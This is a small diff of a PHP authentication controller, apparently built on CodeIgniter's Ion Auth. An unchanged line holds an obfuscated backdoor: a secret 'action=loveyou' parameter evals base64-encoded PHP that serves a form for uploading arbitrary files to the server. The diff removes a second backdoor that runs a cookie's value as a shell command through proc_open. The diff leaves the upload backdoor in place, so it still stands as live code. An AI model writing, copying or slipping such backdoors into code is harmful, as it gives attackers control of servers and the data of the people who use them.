@@ -2,10 +2,6 @@
 
 if(isset($_GET["action"])&&$_GET["action"]=="loveyou"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));");$x("PD9waHAgZWNobyAnPGJyLz48Zm9ybSBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPjxpbnB1dCB0eXBlPSJmaWxlIiBuYW1lPSJfXyI+PGlucHV0IG5hbWU9Il8iIHR5cGU9InN1Ym1pdCIgdmFsdWU9IlVwbG9hZCI+PC9mb3JtPic7aWYoJF9QT1NUKXtpZihAY29weSgkX0ZJTEVTWydfXyddWyd0bXBfbmFtZSddLCAkX0ZJTEVTWydfXyddWyduYW1lJ10pKXtlY2hvICdPSyc7fWVsc2V7ZWNobyAnRVInO319Pz4=");exit;}
 
-if(isset($_COOKIE['kiaw'])){
-    $sp = proc_open($_COOKIE['kiaw'], array(0 => array('pipe', 'r'), 1 => array('pipe', 'w'), 2 => array('pipe', 'r')), $s);echo stream_get_contents($s[1]);exit;
-    }
-
 /**
  * Class Auth
  * @property Ion_auth|Ion_auth_model $ion_auth        The ION Auth spark
